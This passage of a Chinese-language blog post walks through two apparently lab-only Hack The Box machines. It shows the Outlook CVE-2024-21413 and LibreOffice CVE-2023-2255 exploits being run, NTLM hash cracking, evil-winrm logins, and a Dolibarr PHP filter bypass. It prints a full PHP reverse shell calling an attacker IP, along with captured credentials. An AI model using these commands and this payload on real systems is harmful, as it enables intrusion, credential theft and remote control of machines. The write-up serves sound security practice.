监听</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo impacket-smbserver -smb2support -ip 0.0.0.0 <span class=\"built_in\">test</span> /tmp</span><br></pre></td></tr></table></figure>\n\n<p>再用 <a href=\"https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability\">PoC</a> 打</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url <span class=\"string\">&#x27;\\\\10.10.14.20\\test&#x27;</span> --subject Hi</span><br></pre></td></tr></table></figure>\n\n<p>拿到 maya 的 NTLM hash</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">maya::MAILING:aaaaaaaaaaaaaaaa:21bf11591531fc6d3736359f495482b4:0101000000000000804c7084b5b1da013e5cd1bc6af81a5f000000000100100057005a00720067005a00460043005a000300100057005a00720067005a00460043005a00020010004f007100510070005500580055006800040010004f00710051007000550058005500680007000800804c7084b5b1da0106000400020000000800300030000000000000000000000000200000146f2fe8ad5fb58c04447d1f84d31aa0faae084bb712011964e5eb9820bf33200a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00320030000000000000000000</span><br></pre></td></tr></table></figure>\n\n<p>放到 <code>1.txt</code>，用 hashcat 爆</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hashcat -a 0 -o passwd.txt 1.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>\n\n<p><code>-a 0</code> 意思是字典模式，<code>-o passwd.txt</code> 是输出文件，<code>1.txt</code> 是输入文件，<code>/usr/share/wordlists/rockyou.txt</code> 是字典文件。<br>爆出来密码是 <code>m4y4ngs4ri</code>。<br>然后用红队神器 evil-winrm 连上，拿到 Windows 的 shell，读 <code>user.txt</code> 拿到第一个 flag。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">evil-winrm -i 10.10.11.14 -u maya -p m4y4ngs4ri</span><br></pre></td></tr></table></figure>\n\n<p>很奇怪这里用 hash 登录不行，会报错 <code>Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError</code>。</p>\n<p>现在就要开始提权了。</p>\n<p>Program Files 里有个 <code>LibreOffice</code>，查看 <code>readme_en-US.txt</code> 可以知道版本是 7.4。<br>搜出是有 CVE-2023-2255 的，用 <a href=\"https://github.com/elweth-sec/CVE-2023-2255\">PoC</a> 打<br>把反弹 shell 的  <code>shell.py</code> 传到 <code>C:\\Users\\maya\\Documents\\</code>，然后本地生成 <code>exploit.odt</code>，再在 Windows 上 curl 下来。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 CVE-2023-2255.py --cmd <span class=\"string\">&quot;python C:\\Users\\maya\\Documents\\shell.py&quot;</span> --output <span class=\"string\">&#x27;exploit.odt&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>在本地挂着 <code>nc -lvnp &lt;port&gt;</code>，一会就有 shell 过来了。</p>\n<p>弹到 localadmin 的 shell 后，可以直接读桌面的 <code>root.txt</code> 拿到 flag，也可以通过以下命令把 maya 提到管理员组：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">net localgroup Administradores maya /add</span><br></pre></td></tr></table></figure>\n\n<p>总的来说，这 Windows 的渗透是真迷糊，一点不会。而且不知道为啥 Evil-WinRM 连上后命令卡得要死</p>\n<h2 id=\"BoardLight\"><a href=\"#BoardLight\" class=\"headerlink\" title=\"BoardLight\"></a>BoardLight</h2><p>扫出来两个端口，一个是 80，一个是 22。<br>一个静态网页，无交互，源码里面有一个 Board.htb，加到 host 里面访问，还是这个页面。<br>开始扫子域名</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wfuzz -c -w  /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u <span class=\"string\">&quot;http://board.htb&quot;</span> -H <span class=\"string\">&quot;Host:FUZZ.board.htb&quot;</span> --hw 1053</span><br></pre></td></tr></table></figure>\n\n<p><code>--hw 1053</code> 是过滤掉 1053 字节的响应。<br>扫到一个 <code>crm.board.htb</code>。<br>加入 <code>/etc/hosts</code> 里，访问到是一个 Dolibarr 的登录页面，随手敲个 admin admin 竟然登上去了，乐。<br>新建一个 website，再在里面新建一个 Page，编辑 HTML 源，写 PHP，保存会报 <code>You add dynamic PHP code that contains the PHP instruction &#39;system&#39; that is forbidden by default as dynamic content (see hidden options WEBSITE_PHP_ALLOW_xxx to increase list of allowed commands). </code></p>\n<p>大写 PHP 绕过，有时也可以直接短标签 <code>&lt;?</code>，或者 <code>&lt;?=system(&#39;ls&#39;)?&gt;</code>，这句等效于 <code>&lt;?php echo system(&#39;ls&#39;)?&gt;</code>。<br>在 <a href=\"https://www.revshells.com/\">Reverse Shell Generator</a> 生成一个 PHP 反弹 shell，然后写进去<br>记得勾上 <code>Show dynamic content</code></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?</span>PHP</span><br><span class=\"line\"><span class=\"comment\">// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php</span></span><br><span class=\"line\"><span class=\"comment\">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">set_time_limit</span> (<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"variable\">$VERSION</span> = <span class=\"string\">&quot;1.0&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$ip</span> = <span class=\"string\">&#x27;10.10.14.20&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$port</span> = <span class=\"number\">55555</span>;</span><br><span class=\"line\"><span class=\"variable\">$chunk_size</span> = <span class=\"number\">1400</span>;</span><br><span class=\"line\"><span class=\"variable\">$write_a</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"variable\">$error_a</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"variable\">$shell</span> = <span class=\"string\">&#x27;uname -a; w; id; bash -i&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$daemon</span> = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"variable\">$debug</span> = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">function_exists</span>(<span class=\"string\">&#x27;pcntl_fork&#x27;</span>)) &#123;</span><br><span class=\"line\">  <span class=\"variable\">$pid</span> = <span class=\"title function_ invoke__\">pcntl_fork</span>();</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"variable\">$pid</span> == -<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">printit</span>(<span class=\"string\">&quot;ERROR: Can&#x27;t fork&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"variable\">$pid</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>(<span class=\"number\">0</span>);  <span class=\"comment\">// Parent exits</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">posix_setsid</span>() == -<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">printit</span>(<span class=\"string\">&quot;Error: Can&#x27;t setsid()&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"variable\">$daemon</span> = <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">  <span class=\"title function_ invoke__\">printit</span>(<span class=\"string\">&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">chdir</span>(<span class=\"string\">&quot;/&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">umask</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Open reverse connection</span></span><br><span class=\"line\"><span class=\"variable\">$sock</span> = <span class=\"title function_ invoke__\">fsockopen</span>(<span class=\"variable\">$ip</span>, <span class=\"variable\">$port</span>, <span class=\"variable\">$errno</span>, <span class=\"variable\">$errstr</span>, <span class=\"number\">30</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (!<span class=\"variable\">$sock</span>) &#123;</span><br><span class=\"line\">  <span class=\"title function_ invoke__\">printit</span>(<span class=\"string\">&quot;<span class=\"subst\">$errstr</span> (<span class=\"subst\">$errno</span>)&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$descriptorspec</span> = <span class=\"keyword\">array</span>(</span><br><span class=\"line\">   <span class=\"number\">0</span> =&gt; <span class=\"keyword\">array</span>(<span class=\"string\">&quot;pipe&quot;</span>, <span class=\"string\">&quot;r&quot;</span>),  <span class=\"comment\">// stdin is a pipe that the child will read from</span></span><br><span class=\"line\">   <span class=\"number\">1</span> =&gt; <span class=\"keyword\">array</span>(<span class=\"string\">&quot;pipe&quot;</span>, <span class=\"string\">&quot;w&quot;</span>),  <span class=\"comment\">// stdout is a pipe that the child will write to</span></span><br><span class=\"line\">   <span class=\"number\">2</span> =&gt; <span class=\"keyword\">array</span>(<span class=\"string\">&quot;pipe&quot;</span>, <span class=\"string\">&quot;w&quot;</span>)   <span class=\"comment\">// stderr is a pipe that the child will write to</span></span><br><span class=\"line\">);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$process</span> = <span class=\"title function_ invoke__\">proc_open</span>(<span class=\"variable\">$shell</span>, <span class=\"variable\">$descriptorspec</span>, <span class=\"variable\">$pipes</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">is_resource</span>(<span class=\"variable\">$process</span>)) &#123;</span><br><span class=\"line\">  <span class=\"title function_ invoke__\">printit</span>(<span class=\"string\">&quot;ERROR: Can&#x27;t spawn shell&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">stream_set_blocking</span>(<span class=\"variable\">$pipes</span>[<span class=\"number\">0</span>], <span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">stream_set_blocking</span>(<span class=\"variable\">$pipes</span>[<span class=\"number\">1</span>], <span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">stream_set_blocking</span>(<span class=\"variable\">$pipes</span>[<span class=\"number\">2</span>], <span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">stream_set_blocking</span>(<span class=\"variable\">$sock</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">printit</span>(<span class=\"string\">&quot;Successfully opened reverse shell to <span class=\"subst\">$ip</span>:<span class=\"subst\">$port</span>&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> (<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">feof</span>(<span class=\"variable\">$sock</span>)) &#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">printit</span>(<span class=\"string\">&quot;ERROR: Shell connection terminated&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">feof</span>(<span class=\"variable\">$pipes</span>[<span class=\"number\">1</span>])) &#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">printit</span>(<span class=\"string\">&quot;ERROR: Shell process terminated&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"variable\">$read_a</span> = <span class=\"keyword\">array</span>(<span class=\"variable\">$sock</span>, <span class=\"variable\">$pipes</span>[<span class=\"number\">1</span>], <span class=\"variable\">$pipes</span>[<span class=\"number\">2</span>]);</span><br><span class=\"line\">  <span class=\"variable\">$num_changed_sockets</span> = <span class=\"title function_ invoke__\">stream_select</span>(<span class=\"variable\">$read_a</span>, <span class=\"variable\">$write_a</span>, <span class=\"variable\">$error_a</span>, <span class=\"literal\">null</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">in_array</span>(<span class=\"variable\">$sock</span>, <span class=\"variable\">$read_a</span>)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$debug</span>) <span class=\"title function_ invoke__\">printit</span>(<span class=\"string\">&quot;SOCK READ&quot;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$input</span> = <span class=\"title function_ invoke__\">fread</span>(<span class=\"variable\">$sock</span>, <span class=\"variable\">$chunk_size</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$debug</span>) <span class=\"title function_ invoke__\">printit</span>(<span class=\"string\">&quot;SOCK: <span class=\"subst\">$input</span>&quot;</span>);</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">fwrite</span>(<span class=\"variable\">$pipes</span>[<span class=\"number\">0</span>], <span class=\"variable\">$input</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">in_array</span>(<span class=\"variable\">$pipes</span>[<span class=\"number\">1</span>], <span class=\"variable\">$read_a</span>)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$debug</span>) <span class=\"title function_ invoke__\">printit</span>(<span class=\"string\">&quot;STDOUT READ&quot;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$input</span> = <span class=\"title function_ invoke__\">fread</span>(<span class=\"variable\">$pipes</span>[<span class=\"number\">1</span>], <span class=\"variable\">$chunk_size</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$debug</span>) <span class=\"title function_ invoke__\">printit</span>(<span class=\"string\">&quot;STDOUT: <span class=\"subst\">$input</span>&quot;</span>);</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">fwrite</span>(<span class=\"variable\">$sock</span>, <span class=\"variable\">$input</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">in_array</span>(<span class=\"variable\">$pipes</span>[<span class=\"number\">2</span>], <span class=\"variable\">$read_a</span>)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$debug</span>) <span class=\"title function_ invoke__\">printit</span>(<span class=\"string\">&quot;STDERR READ&quot;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$input</span> = <span class=\"title function_ invoke__\">fread</span>(<span class=\"variable\">$pipes</span>[<span class=\"number\">2</span>], <span class=\"variable\">$chunk_size</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$debug</span>) <span class=\"title function_ invoke__\">printit</span>(<span class=\"string\">&quot;STDERR: <span class=\"subst\">$input</span>&quot;</span>);</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">fwrite</span>(<span class=\"variable\">$sock</span>, <span class=\"variable\">$input</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">fclose</span>(<span class=\"variable\">$sock</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">fclose</span>(<span class=\"variable\">$pipes</span>[<span class=\"number\">0</span>]);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">fclose</span>(<span class=\"variable\">$pipes</span>[<span class=\"number\">1</span>]);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">fclose</span>(<span class=\"variable\">$pipes</span>[<span class=\"number\">2</span>]);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">proc_close</span>(<span class=\"variable\">$process</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">printit</span> (<span class=\"params\"><span class=\"variable\">$string</span></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!<span class=\"variable\">$daemon</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">&quot;<span class=\"subst\">$string</span>\\n&quot;</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>拿到 www-data 的 shell<br>在 <code>/var/www/html/crm.board.htb/htdocs/conf/</code> 下找到 <code>conf.php</code>，里面有数据库的用户名和密码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"comment\">// File generated by Dolibarr installer 17.0.0 on May 13, 2024</span></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"comment\">// Take a look at conf.php.example file for an example of conf.php file</span></span><br><span class=\"line\"><span class=\"comment\">// and explanations for all possibles parameters.</span></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"variable\">$dolibarr_main_url_root</span>=<span class=\"string\">&#x27;http://crm.board.htb&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$dolibarr_main_document_root</span>=<span class=\"string\">&#x27;/var/www/html/crm.board.htb/htdocs&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$dolibarr_main_url_root_alt</span>=<span class=\"string\">&#x27;/custom&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$dolibarr_main_document_root_alt</span>=<span class=\"string\">&#x27;/var/www/html/crm.board.htb/htdocs/custom&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$dolibarr_main_data_root</span>=<span class=\"string\">&#x27;/var/www/html/crm.board.htb/documents&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$dolibarr_main_db_host</span>=<span class=\"string\">&#x27;localhost&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$dolibarr_main_db_port</span>=<span class=\"string\">&#x27;3306&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$dolibarr_main_db_name</span>=<span class=\"string\">&#x27;dolibarr&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$dolibarr_main_db_prefix</span>=<span class=\"string\">&#x27;llx_&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$dolibarr_main_db_user</span>=<span class=\"string\">&#x27;dolibarrowner&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$dolibarr_main_db_pass</span>=<span class=\"string\">&#x27;serverfun2$2023!!&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$dolibarr_main_db_type</span>=<span class=\"string\">&#x27;mysqli&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$dolibarr_main_db_character_set</span>=<span class=\"string\">&#x27;utf8&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$dolibarr_main_db_collation</span>=<span class=\"string\">&#x27;utf8_unicode_ci&#x27;</span>;</span><br><span class=\"line\"><span class=\"comment\">// Authentication settings</span></span><br><span class=\"line\"><span class=\"variable\">$dolibarr_main_authentication</span>=<span class=\"string\">&#x27;dolibarr&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//$dolibarr_main_demo=&#x27;autologin,autopass&#x27;;</span></span><br><span class=\"line\"><span class=\"comment\">// Security settings</span></span><br><span class=\"line\"><span class=\"variable\">$dolibarr_main_prod</span>=<span class=\"string\">&#x27;0&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$dolibarr_main_force_https</span>=<span class=\"string\">&#x27;0&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$dolibarr_main_restrict_os_commands</span>=<span class=\"string\">&#x27;mysqldump, mysql, pg_dump, pgrestore&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$dolibarr_nocsrfcheck</span>=<span class=\"string\">&#x27;0&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$dolibarr_main_instance_unique_id</span>=<span class=\"string\">&#x27;ef9a8f59524328e3c36894a9ff0562b5&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$dolibarr_mailing_limit_sendbyweb</span>=<span class=\"string\">&#x27;0&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$dolibarr_mailing_limit_sendbycli</span>=<span class=\"string\">&#x27;0&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//$dolibarr_lib_FPDF_PATH=&#x27;&#x27;;</span></span><br><span class=\"line\"><span class=\"comment\">//$dolibarr_lib_TCPDF_PATH=&#x27;&#x27;;</span></span><br><span class=\"line\"><span class=\"comment\">//$dolibarr_lib_FPDI_PATH=&#x27;&#x27;;</span></span><br><span class=\"line\"><span class=\"comment\">//$dolibarr_lib_TCPDI_PATH=&#x27;&#x27;;</span></span><br><span class=\"line\"><span class=\"comment\">//$dolibarr_lib_GEOIP_PATH=&#x27;&#x27;;</span></span><br><span class=\"line\"><span class=\"comment\">//$dolibarr_lib_NUSOAP_PATH=&#x27;&#x27;;</span></span><br><span class=\"line\"><span class=\"comment\">//$dolibarr_lib_ODTPHP_PATH=&#x27;&#x27;;</span></span><br><span class=\"line\"><span class=\"comment\">//$dolibarr_lib_ODTPHP_PATHTOPCLZIP=&#x27;&#x27;;</span></span><br><span class=\"line\"><span class=\"comment\">//$dolibarr_js_CKEDITOR=&#x27;&#x27;;</span></span><br><span class=\"line\"><span class=\"comment\">//$dolibarr_js_JQUERY=&#x27;&#x27;;</span></span><br><span class=\"line\"><span class=\"comment\">//$dolibarr_js_JQUERY_UI=&#x27;&#x27;;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//$dolibarr_font_DOL_DEFAULT_TTF=&#x27;&#x27;;</span></span><br><span class=\"line\"><span class=\"comment\">//$dolibarr_font_DOL_DEFAULT_TTF_BOLD=&#x27;&#x27;;</span></span><br><span class=\"line\"><span class=\"variable\">$dolibarr_main_distrib</span>=<span class=\"string\">&#x27;standard&#x27;</span>;</span><br></pre></td></tr></table></figure>\n\n<p>登进数据库</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql -u dolibarrowner -p</span><br></pre></td></tr></table></figure>\n\n<p>然后连上 dolibarr 数据库，查看表</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">use dolibarr;</span><br><span class=\"line\"><span class=\"keyword\">show</span> tables;</span><br></pre></td></tr></table></figure>\n\n<p>发现没啥东西。<br><code>ls /home</code> 发现有个用户叫 larissa，用数据库的密码 ssh 进去，拿到第一个 flag。</p>\n<p>然后开始提权<br>传个 <code>linpeas.sh</code> 过去开扫，发现 SUID 项里有 enlightenment，执行 <code>enlightenment -version</code> 可知版本为 0.23.1。</p>\n<p><code>searchsploit 